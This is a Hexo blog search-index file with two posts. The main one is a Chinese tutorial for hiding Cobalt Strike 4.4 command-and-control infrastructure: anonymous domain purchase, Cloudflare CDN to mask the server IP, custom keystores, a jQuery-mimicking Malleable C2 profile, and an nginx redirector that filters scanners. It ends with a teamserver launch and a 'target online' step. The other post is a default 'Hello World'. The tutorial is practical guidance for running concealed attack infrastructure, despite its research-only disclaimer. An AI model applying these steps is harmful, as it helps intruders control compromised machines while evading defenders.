<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>APT级隐藏搭建CS4.4教程——Nginx反向代理+C2-Profile+CDN</title>
    <link href="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/"/>
    <url>/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/</url>
    
    <content type="html"><![CDATA[<p> ——————————————<strong>TOP：APT级隐藏搭建CobaltStrike4.4教程——Nginx反向代理+C2-Profile+CDN</strong>——————————————————</p><p><strong>声明：</strong><br>         <strong>分享的内容仅用于技术讨论，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，如因此产生的一切不良后果与文章作者和本博客不关，文章作者不承担全部法律及连带责任。</strong></p><hr><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>基于渗透的角度，CS是一把利剑，由于其广泛的使用，特征很明显，隐藏c2特征很必要。APT级搭建：使用nginx反向代理+C2-Profile+CDN。</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">cobalt strike：CS 4.4<br>VPS：ubuntu<br>反代：nginx/1.20.1<br>域名：Godaddy/dynadot  <br>CDN：Cloudflare<br></code></pre></td></tr></table></figure><h3 id="一、购买域名、VPS"><a href="#一、购买域名、VPS" class="headerlink" title="一、购买域名、VPS"></a>一、购买域名、VPS</h3><p>1.域名： 购买域名到官网注册账号进行购买就可以 </p><p>​     xyzhome.me是不存在的域名</p><p>​    PS：推荐购买国外的，国外的域名购买不是需要实名认证</p><p>2.VPS： 自行选择厂商购买</p><p>​    安装：java、nginx、net-tools</p><p>​    PS：推荐购买ubuntu、反正不购买windows操作系统就行</p><h3 id="二、Cloudflare做CDN-（域名解析VPS服务器-CDN）"><a href="#二、Cloudflare做CDN-（域名解析VPS服务器-CDN）" class="headerlink" title="二、Cloudflare做CDN （域名解析VPS服务器+CDN）"></a>二、Cloudflare做CDN （域名解析VPS服务器+CDN）</h3><p>域名+vps购买后，通过第三方cloudflare托管，使用cloudflare提供免费的CDN服务：<br>首次使用需要注册cloudflare账号，推荐使用protonmail邮箱进行注册；</p><h4 id="1-域名解析vps服务器："><a href="#1-域名解析vps服务器：" class="headerlink" title="1.域名解析vps服务器："></a>1.域名解析vps服务器：</h4><p>（1）添加需要托管的域名：</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/1.png" class="" title="This is an example image"><p>（2）选择免费的</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/2.png" class="" title="This is an example image"><p>（3）添加一条A记录：添加子域名、vps的IP地址</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/3.png" class="" title="This is an example image"><p>（4）将cloudflare名称服务器（两个cloudflare子域名）复制到域名DNS管理去</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/4.png" class="" title="This is an example image"><p>​            到这步基本完成了：通过域名去访问解析到vps。</p><h4 id="2-生成证书-SSL-x2F-TLS-："><a href="#2-生成证书-SSL-x2F-TLS-：" class="headerlink" title="2.生成证书(SSL&#x2F;TLS)："></a>2.生成证书(SSL&#x2F;TLS)：</h4><p>为了更好的隐藏特征，不使用cs自带的证书，通过利用cloudflare的证书文件去生成“ keystore文件”。</p><p>  （1）SSL&#x2F;TLS—-源服务器—创建证书—默认创建 （因为要给域名做cdn，别人通过访问域名不能找到VPS主机的真实IP地址，而是利用cloudflare的dns服务器提供免费的加速功能）</p><h5 id="A-创建证书："><a href="#A-创建证书：" class="headerlink" title="A.创建证书："></a>A.创建证书：</h5><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/5.png" class="" title="This is an example image"><h5 id="B-选择创建证书的私钥类型：RSA-2048"><a href="#B-选择创建证书的私钥类型：RSA-2048" class="headerlink" title="B.选择创建证书的私钥类型：RSA(2048)"></a>B.选择创建证书的私钥类型：RSA(2048)</h5><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/6.png" class="" title="This is an example image"><h5 id="C-选择密钥生成格式：PEM"><a href="#C-选择密钥生成格式：PEM" class="headerlink" title="C. 选择密钥生成格式：PEM"></a>C. 选择密钥生成格式：PEM</h5><p>将源证书(保存文件名.pem)、私钥(保存文件名.key)复制粘贴保存好，需要上传到服务器上。（ps：不要将两个文件保存反了，会出错）</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/7.png" class="" title="This is an example image"><h4 id="3-CDN-配置-Cloudflare-默认的-TLS-配置为灵活，由于使用-Cloudflare-的证书，改成完全（严格）提高安全性"><a href="#3-CDN-配置-Cloudflare-默认的-TLS-配置为灵活，由于使用-Cloudflare-的证书，改成完全（严格）提高安全性" class="headerlink" title="3.CDN 配置 Cloudflare 默认的 TLS 配置为灵活，由于使用 Cloudflare 的证书，改成完全（严格）提高安全性"></a>3.CDN 配置 Cloudflare 默认的 TLS 配置为灵活，由于使用 Cloudflare 的证书，改成完全（严格）提高安全性</h4><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/8.png" class="" title="This is an example image"><h5 id="（1）规则—-gt-页面规则："><a href="#（1）规则—-gt-页面规则：" class="headerlink" title="（1）规则—&gt;页面规则："></a>（1）规则—&gt;页面规则：</h5><p>禁用缓存推荐的做法是创建 Cloudflare 规则，不代理 js 请求。</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/9.png" class="" title="This is an example image"><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/10.png" class="" title="This is an example image"><p>到这里就完成了域名解析到VPS服务器和给域名做好了CDN。</p><p>接下来登录上vps服务器上通过 pem.pem和key.key文件生成CS的keystore文件。</p><h3 id="三、VPS上生成CS的keystrore文件"><a href="#三、VPS上生成CS的keystrore文件" class="headerlink" title="三、VPS上生成CS的keystrore文件"></a>三、VPS上生成CS的keystrore文件</h3><h4 id="1-VPS的SSL目录下生成keystore文件"><a href="#1-VPS的SSL目录下生成keystore文件" class="headerlink" title="1.VPS的SSL目录下生成keystore文件"></a>1.VPS的SSL目录下生成keystore文件</h4><p>（1）生成 <a href="http://www.xyzhome.me.p12/">www.xyzhome.me.p12</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">密码：mm123456mm<br>域名：www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span><br>openssl pkcs12 -export -<span class="hljs-keyword">in</span> pem<span class="hljs-selector-class">.pem</span> -inkey key<span class="hljs-selector-class">.key</span> -out  www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span><span class="hljs-selector-class">.p12</span> -name www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span> -passout pass:mm123456mm<br></code></pre></td></tr></table></figure><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/11.png" class="" title="This is an example image"><p>（2）生成 <a href="http://www.xyzhome.me.store/">www.xyzhome.me.store</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">keytool -importkeystore -deststorepass mm123456mm -destkeypass mm123456mm -destkeystore  www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span><span class="hljs-selector-class">.store</span> -srckeystore  www<span class="hljs-selector-class">.xyzhome</span><span class="hljs-selector-class">.me</span><span class="hljs-selector-class">.p12</span> -srcstoretype PKCS12 -srcstorepass mm123456mm -alias www<span class="hljs-selector-class">.xyzhome</span>.me<br></code></pre></td></tr></table></figure><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/12.png" class="" title="This is an example image"><p>（3）生成 <a href="http://www.xyzhome.me.store/">www.xyzhome.me.store</a> 文件移动到CS 4.4 的根目录下： </p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/13.png" class="" title="This is an example image"><h3 id="四、VPS上搭建CS"><a href="#四、VPS上搭建CS" class="headerlink" title="四、VPS上搭建CS"></a>四、VPS上搭建CS</h3><h4 id="Profile配置"><a href="#Profile配置" class="headerlink" title="Profile配置:"></a>Profile配置:</h4><p> 需要使用 Profile脚本 让 Beacon 和 Teamserver 之间通讯的流量迷惑他人，显示正常的流量。 Github 上有非常多优秀的 C2-Profile 可供我们使用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rsmudge/</span>Malleable-C2-Profiles<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/threatexpress/m</span>alleable-c2<br></code></pre></td></tr></table></figure><h5 id="1-下载profile文件——jquery-c2-4-4-profile："><a href="#1-下载profile文件——jquery-c2-4-4-profile：" class="headerlink" title="1.下载profile文件——jquery-c2.4.4.profile："></a>1.下载profile文件——jquery-c2.4.4.profile：</h5><p>（重点：这个文件需要放到CS 的根目录，剩下就是修改这个文件） 这里演示使用<a href="https://github.com/threatexpress/malleable-c2%E7%9A%84jquery-c2.4.4.profile%E3%80%82%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E5%90%8E%E9%9C%80%E8%A6%81%E5%AF%B9">https://github.com/threatexpress/malleable-c2的jquery-c2.4.4.profile。下载下来后需要对</a> Profile 进行修改。</p><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/14.png" class="" title="This is an example image"><h5 id="2-需要修改四个模块：https-certificate、http-stager、http-get、http-post："><a href="#2-需要修改四个模块：https-certificate、http-stager、http-get、http-post：" class="headerlink" title="2.需要修改四个模块：https-certificate、http-stager、http-get、http-post："></a>2.需要修改四个模块：https-certificate、http-stager、http-get、http-post：</h5><p>（1）修改 https-certificate模块：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> keystore <span class="hljs-comment">&quot;/pathtokeystore&quot;</span>;     <span class="hljs-comment">//这里的/pathtokeystore修改为自己生成的：www.xyzhome.me.store</span><br><span class="hljs-keyword">set</span> password <span class="hljs-comment">&quot;password&quot;</span>;           <span class="hljs-comment">//这里的密码是用于生成keystore文件的密码：mm123456mm</span><br>修改为：<br><span class="hljs-keyword">set</span> keystore <span class="hljs-comment">&quot;www.xyzhome.me.store&quot;</span>;   <br><span class="hljs-keyword">set</span> password <span class="hljs-comment">&quot;mm123456mm&quot;</span>;<br></code></pre></td></tr></table></figure><p>（2）修改 http-stager、http-get、http-post三个模块下的client、sever：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;code.jquery.com&quot;</span>;   <span class="hljs-comment">//这里的code.jquery.com是我们需要填写我们的cloudflare上的域名：www.xyzhome.me，Referer：响应的去向</span><br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://code.jquery.com&quot;</span>;<br>修改为：<br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;www.xyzhome.me&quot;</span>;<br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;https://www.google.com&quot;</span>;<br><br><span class="hljs-comment">//需要修改的地方有3处（http-stager、http-get、http-post），因为后期目标上线cs之后，执行命令：shell whomai后，没有回显结果</span><br>在cobalt strike客户端执行命令后才有命令行回显<br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/javascript; charset=utf-8&quot;</span><br>修改为：<br><span class="hljs-keyword">header</span> <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/*; charset=utf-8&quot;</span>;<br></code></pre></td></tr></table></figure><p>3.jquery-c2.4.4.profile文件—修改端口</p><p>容易出问题之处：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">有的师傅<span class="hljs-number">443</span>端口是有用处的，需要改成其他的端口。这里需要注意的是免费版的Cloudflare对代理的端口有限制。我们只能设置成如下端口：<br>http：<span class="hljs-number">80</span>、<span class="hljs-number">8080、8880</span>、<span class="hljs-number">2052、2082</span>、<span class="hljs-number">2086、2095</span><br>https：<span class="hljs-number">443、2053</span>、<span class="hljs-number">2083、2087</span>、<span class="hljs-number">2096、8443</span><br></code></pre></td></tr></table></figure><p>（1）修改端口</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> tcp_port <span class="hljs-comment">&quot;42585&quot;</span>;   <br>修改为：<br><span class="hljs-keyword">set</span> tcp_port <span class="hljs-comment">&quot;8443&quot;</span>;   <br></code></pre></td></tr></table></figure><h4 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h4><h5 id="1-Nginx反向代理"><a href="#1-Nginx反向代理" class="headerlink" title="1.Nginx反向代理"></a>1.Nginx反向代理</h5><p>这里是使用 <a href="https://github.com/threatexpress/cs2modrewrite">https://github.com/threatexpress/cs2modrewrite</a> 的nginx脚本做反向代理。(或者考虑域前置的caddy）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python cs2nginx<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> havex<span class="hljs-selector-class">.profile</span> -c https:<span class="hljs-comment">//127.0.0.1:8443 -r https://www.baidu.com -H www.xyzhome.me</span><br>对各个参数进行说明：<br>-<span class="hljs-selector-tag">i</span> 为模板文件，这个固定的，可以不用管。<br>-c 为后端 CS 绑定的端口，这个会在后面 CS 的配置中有所体现<br>-r 为不合要求的访问 <span class="hljs-number">302</span> 重定向去的位置，这里填了百度<br>-H 为你的域名，这里就是你配的那个<br></code></pre></td></tr></table></figure><p>把输出的内容保存为：nginx.conf。</p><h5 id="2-配置nginx-conf"><a href="#2-配置nginx-conf" class="headerlink" title="2.配置nginx.conf"></a>2.配置nginx.conf</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>修改第<span class="hljs-number">1</span>处：vps是ubuntu，需要root用户去执行，如windows无需修改，这也是nginx做反向代理后 https无法上线的原因<br>user www-data <br>修改为：<br>user root<br><br><span class="hljs-regexp">//</span>修改第<span class="hljs-number">2</span>处：当nginx反代时监听<span class="hljs-number">443</span>端口<br><span class="hljs-comment">#listen 443 ssl;</span><br><span class="hljs-comment">#listen [::]:443 ssl;</span><br>改为：<br>listen <span class="hljs-number">443</span> ssl;<br>listen [::]:<span class="hljs-number">443</span> ssl;<br><br><span class="hljs-regexp">//</span>修改第<span class="hljs-number">3</span>处：因为我们的证书是cloudflare的证书，需要走证书才能做反代<br><span class="hljs-comment">#ssl_certificate /etc/letsencrypt/live/&lt;DOMAIN_NAME&gt;/fullchain.pem; # managed by Certbot</span><br><span class="hljs-comment">#ssl_certificate_key /etc/letsencrypt/live/&lt;DOMAIN_NAME&gt;/privkey.pem; # managed by Certbot</span><br>修改为：<br>ssl_certificate <span class="hljs-regexp">/root/</span>ssl/pem.pem; <span class="hljs-comment"># managed by Certbot</span><br>ssl_certificate_key <span class="hljs-regexp">/root/</span>ssl/key.key; <span class="hljs-comment"># managed by Certbot</span><br><br><br><span class="hljs-regexp">//</span>修改第<span class="hljs-number">4</span>处：定制化处理location块，使得只有指定URL才能访问，保证了不会被扫到，设置指定User-Agent，当User-Agent不符合,直接重定向<span class="hljs-number">302</span>  <br>location ~ ^(<span class="hljs-regexp">/api/</span><span class="hljs-number">516280565959</span>.*|<span class="hljs-regexp">/blog/</span>wp-includes<span class="hljs-regexp">/pomo/</span>src.php.*|<span class="hljs-regexp">/includes/</span>phpmailer<span class="hljs-regexp">/class.pop3.php.*|/i</span>nclude<span class="hljs-regexp">/template/i</span>sx.php.*|<span class="hljs-regexp">/wp06/</span>wp-includes<span class="hljs-regexp">/po.php.*|/</span>api<span class="hljs-regexp">/516280565958.*|/m</span>odules<span class="hljs-regexp">/mod_search.php.*|/</span>wp08<span class="hljs-regexp">/wp-includes/</span>dtcla.php.*)$ &#123;<br>            proxy_pass          <span class="hljs-variable">$C2_SERVER</span>;<br>修改为： <br>location ~ ^(<span class="hljs-regexp">/jquery-3\.3\.1\.slim\.min\.js|/</span>jquery-<span class="hljs-number">3</span>\.<span class="hljs-number">3</span>\.<span class="hljs-number">2</span>\.min\.js|<span class="hljs-regexp">/jquery-3\.3\.1\.min\.js|/</span>jquery-<span class="hljs-number">3</span>\.<span class="hljs-number">3</span>\.<span class="hljs-number">2</span>\.slim\.min\.js)$ &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_user_agent</span> != <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span>) &#123;<br>            return <span class="hljs-number">302</span> <span class="hljs-variable">$REDIRECT_DOMAIN</span><span class="hljs-variable">$request_uri</span>;&#125;<br>            proxy_pass          <span class="hljs-variable">$C2_SERVER</span>;<br>            <br><span class="hljs-regexp">//</span>修改第<span class="hljs-number">5</span>处：禁用，否则当你修改完<span class="hljs-number">1</span>到<span class="hljs-number">4</span>处时，<span class="hljs-regexp">/etc/</span>nginx/nginx.conf目录下重启nginx：nginx，直接报错<br>more_set_headers <span class="hljs-string">&#x27;Server: Server&#x27;</span>;<br>修改为：<br><span class="hljs-comment">#more_set_headers &#x27;Server: Server&#x27;;           </span><br></code></pre></td></tr></table></figure><p>修改完以上配置之后，将nginx.conf替换vps上的&#x2F;etc&#x2F;nginx&#x2F;nginx.conf， 重启nginx：nginx</p><p>（1）查看nginx端口是否已经在监听443端口：</p><blockquote><p>netstat -tlnp</p></blockquote><h3 id="五-配置Cobalt-Strike-Teamserver"><a href="#五-配置Cobalt-Strike-Teamserver" class="headerlink" title="五.配置Cobalt Strike - Teamserver"></a>五.配置Cobalt Strike - Teamserver</h3><h4 id="1-修改端口号、修改指向我们www-xyzhome-me-store文件的路径，store文件密码："><a href="#1-修改端口号、修改指向我们www-xyzhome-me-store文件的路径，store文件密码：" class="headerlink" title="1.修改端口号、修改指向我们www.xyzhome.me.store文件的路径，store文件密码："></a>1.修改端口号、修改指向我们<a href="http://www.xyzhome.me.store文件的路径，store文件密码：">www.xyzhome.me.store文件的路径，store文件密码：</a></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">java -XX:<span class="hljs-attribute">ParallelGCThreads</span>=4 -Dcobaltstrike.<span class="hljs-attribute">server_port</span>=10086 -Dcobaltstrike.<span class="hljs-attribute">server_bindto</span>=0.0.0.0 -Djavax.net.ssl.<span class="hljs-attribute">keyStore</span>=./www.xyzhome.me.store -Djavax.net.ssl.<span class="hljs-attribute">keyStorePassword</span>=mm123456mm -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./IceRiver.jar -Duser.<span class="hljs-attribute">language</span>=en server.TeamServer $*<br></code></pre></td></tr></table></figure><h4 id="2-启动teamserver"><a href="#2-启动teamserver" class="headerlink" title="2.启动teamserver"></a>2.启动teamserver</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">./teamserver vps_ip <span class="hljs-number">123456</span>  jquery-<span class="hljs-built_in">c2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">4</span>.profile<br></code></pre></td></tr></table></figure><h3 id="六-客户端登录-—-目标上线"><a href="#六-客户端登录-—-目标上线" class="headerlink" title="六.客户端登录 — 目标上线"></a>六.客户端登录 — 目标上线</h3><h4 id="1-登录，设置listeners："><a href="#1-登录，设置listeners：" class="headerlink" title="1.登录，设置listeners："></a>1.登录，设置listeners：</h4><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/15.png" class="" title="This is an example image"><h4 id="2-目标上线—执行命令："><a href="#2-目标上线—执行命令：" class="headerlink" title="2.目标上线—执行命令："></a>2.目标上线—执行命令：</h4><img src="/2023/06/04/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-C2-Profile-CDN/16.png" class="" title="This is an example image">]]></content>
    
    
    <categories>
      
      <category>CobaltStrike</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/06/02/hello-world/"/>
    <url>/2023/06/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
